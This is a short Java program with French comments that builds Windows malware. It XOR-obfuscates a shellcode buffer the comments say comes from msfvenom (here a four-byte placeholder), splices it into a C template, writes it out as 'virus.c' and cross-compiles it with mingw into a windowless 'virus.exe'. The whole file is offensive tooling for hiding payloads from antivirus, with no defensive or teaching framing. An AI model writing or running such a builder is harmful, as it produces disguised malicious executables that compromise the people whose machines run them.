import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) {
        try {
            // Buffer généré par msfvenom
            byte[] originalBuffer = {(byte) 0xde, (byte) 0xad, (byte) 0xbe, (byte) 0xef};
            int bufferLen = originalBuffer.length;

            // Obfusque le buffer
            byte[] buffer = new byte[bufferLen];
            for (int i = 0; i < bufferLen; i++) {
                buffer[i] = (byte) (originalBuffer[i] ^ 42);
            }

            // Transforme le buffer en une chaîne de caractères C
            StringBuilder bufferString = new StringBuilder();
            for (byte b : buffer) {
                bufferString.append(String.format("\\x%02x", b));
            }

            // Lit le contenu de "base.c"
            String baseContent = "";
            try (BufferedReader reader = new BufferedReader(new java.io.FileReader("base.c"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    baseContent += line + "\n";
                }
            }

            // Remplace "<BUF>" et "<BUFLEN>" dans le contenu de "base.c"
            baseContent = baseContent.replace("<BUF>", bufferString.toString())
                    .replace("<BUFLEN>", Integer.toString(bufferLen));

            // Écrit le contenu mis à jour dans "virus.c"
            try (FileWriter writer = new FileWriter("virus.c")) {
                writer.write(baseContent);
            }

            // Compilation du code généré en .exe
            String compileCommand = "x86_64-w64-mingw32-gcc -mwindows -Wall virus.c -o virus.exe";
            ProcessBuilder processBuilder = new ProcessBuilder(compileCommand.split(" "));
            processBuilder.directory(new File("."));
            Process compileProcess = processBuilder.start();
            compileProcess.waitFor();

            // Affiche la sortie de la compilation
            BufferedReader compileOutput = new BufferedReader(new InputStreamReader(compileProcess.getInputStream()));
            String line;
            while ((line = compileOutput.readLine()) != null) {
                System.out.println(line);
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
